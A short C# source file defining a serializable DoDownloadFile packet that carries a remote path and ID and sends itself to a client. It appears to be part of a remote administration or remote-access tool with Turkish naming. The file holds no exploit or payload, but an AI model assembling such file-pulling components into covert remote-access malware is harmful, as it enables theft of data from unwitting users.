using System;
using xServer.KuuhakuCekirdek.Ağ;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoDownloadFile : IPacket
    {
        public string RemotePath { get; set; }

        public int ID { get; set; }

        public DoDownloadFile()
        {
        }

        public DoDownloadFile(string remotepath, int id)
        {
            this.RemotePath = remotepath;
            this.ID = id;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}